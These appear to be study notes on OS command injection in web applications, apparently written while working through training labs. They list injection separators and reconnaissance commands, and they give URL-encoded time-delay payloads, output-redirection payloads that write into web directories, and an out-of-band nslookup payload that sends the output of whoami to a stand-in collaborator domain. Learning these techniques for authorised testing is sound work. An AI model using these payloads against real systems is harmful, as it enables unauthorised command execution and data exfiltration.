# Basic

The information is accessed via a URL like
`https://insecure-website.com/stockStatus?productID=432&storeID=32`

- this will execute the shell command with the product and store IDs as arguments such as `stockreport.pl 432 32`

- For command injection, attacker can submit the following input to execute an arbitary command; `& echo asdfsdf &` and the backend will call the command as follow; `stockreport.pl 432 & echo sdfsdfsdf & 32` and will get an error.

eg - `productId=2&storeId=2|whoami` in POST request header

## Useful Commands

| Purpose            | Linux       | Window        |
| ------------------ | ----------- | ------------- |
| Name of user       | whoami      | whoami        |
| OS                 | uname -a    | ver           |
| network conf       | ifconfig    | ipconfig /all |
| network connection | netstat -an | netstat -an   |
| running processes  | ps -ef      | tasklist      |

## Ways of injecting OS commands

- & , && , | , || (both unix and windows)
- ; , 0x0a or \n (for unix)

## using time delays

eg - POST request for form submit =>
`csrf=g12AXHTk57AsU2J2ID68mqsxwVByepIg&name=test&email=test%40gmail.com&subject=Testing&message=Testing+the+OS+command+injection`

- command to inject `& sleep 10s #` (# for comment out the following commands) and change it to url encode.
- then try to inject at the end of each parameters (name, email, subject, message)

`csrf=g12AXHTk57AsU2J2ID68mqsxwVByepIg&name=test&email=test%40gmail.com+%26+sleep+10s+%23&subject=Testing&message=Testing+the+OS+command+injection`

## redirecting output

> `& whoami > /var/www/static/whoami.txt &`

> `%26+whoami+>+/var/www/images/whoami.txt+%23`

## with out-of-band interaction

> `& nslookup `whoami`.BURP-COLLABORATOR-DOMAIN &`
